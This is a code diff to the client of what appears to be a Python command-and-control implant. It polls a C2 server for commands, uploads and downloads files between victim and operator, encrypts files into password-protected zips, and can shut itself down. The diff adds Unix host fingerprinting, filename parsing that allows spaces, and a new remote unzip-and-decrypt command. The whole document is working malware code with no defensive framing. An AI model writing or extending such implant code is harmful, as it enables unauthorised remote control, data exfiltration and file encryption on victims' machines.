@@ -6,10 +6,9 @@ from encryption import cipher
 from settings import (PORT, CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER,
                       FILE_REQUEST, FILE_SEND, ZIP_PASSWORD)
 
-from os import getenv, chdir, getcwd, path
+from os import getenv, uname, chdir, getcwd, path
 
-client = (getenv("USERNAME", "Unknown_Username") + "@" + getenv("COMPUTERNAME", "Unknown_Computername") + "@" +
-          str(time()))
+client = (getenv("LOGNAME") + "@" + uname().nodename + "@" + str(time()))
 
 encrypted_client = cipher.encrypt(client.encode()).decode()
 
@@ -23,14 +22,11 @@ def post_to_server(message: str, response_path=RESPONSE):
         return
 
 
-def get_third_item(input_string, replace=True):
+def get_filename(input_string):
     try:
-        if replace:
-            return input_string.split()[2].replace("\\", "/")
-        else:
-            return input_string.split()[2]
+        return " ".join(input_string.split()[2:]).replace("\\", "/")
     except IndexError:
-        post_to_server(f"You must enter an argument after {input_string}.\n")
+        post_to_server(f"You must enter a filename after {input_string}.\n")
 
 
 while True:
@@ -65,7 +61,7 @@ while True:
         post_to_server(command_output.decode())
 
     elif command.startswith("client download"):
-        filepath = get_third_item(command)
+        filepath = get_filename(command)
         if filepath is None:
             continue
         filename = path.basename(filepath)
@@ -81,7 +77,7 @@ while True:
             post_to_server(f"Unable to write {filename} to disk on {client}.\n")
 
     elif command.startswith("client upload"):
-        filepath = get_third_item(command)
+        filepath = get_filename(command)
         if filepath is None:
             continue
         filename = path.basename(filepath)
@@ -95,7 +91,7 @@ while True:
             post_to_server(f"Unable to access {filepath} on {client}.\n")
 
     elif command.startswith("client zip"):
-        filepath = get_third_item(command)
+        filepath = get_filename(command)
         if filepath is None:
             continue
         filename = path.basename(filepath)
@@ -109,6 +105,19 @@ while True:
                     post_to_server(f"{filepath} is now zip-encrypted on {client}.\n")
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"Unable to access {filepath} on {client}.\n")
+
+    elif command.startswith("client unzip"):
+        filepath = get_filename(command)
+        if filepath is None:
+            continue
+        filename = path.basename(filepath)
+        try:
+            with AESZipFile(filepath) as zip_file:
+                zip_file.setpassword(ZIP_PASSWORD)
+                zip_file.extractall(path.dirname(filepath))
+                post_to_server(f"{filepath} is now unzipped and decrypted on the client.\n")
+        except (FileNotFoundError, PermissionError, OSError):
+            post_to_server(f"{filepath} was not found on the client.\n")
 
     elif command.startswith("client kill"):
         post_to_server(f"{client} has been killed.\n")
